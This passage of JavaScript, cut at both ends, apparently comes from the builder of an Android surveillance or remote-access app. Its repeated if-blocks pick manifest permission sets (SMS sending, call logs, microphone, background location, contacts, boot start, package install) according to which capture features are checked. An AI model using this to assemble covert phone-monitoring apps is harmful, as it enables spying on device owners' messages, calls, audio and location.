            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
        // if 5 checked 
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>        ` 
        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


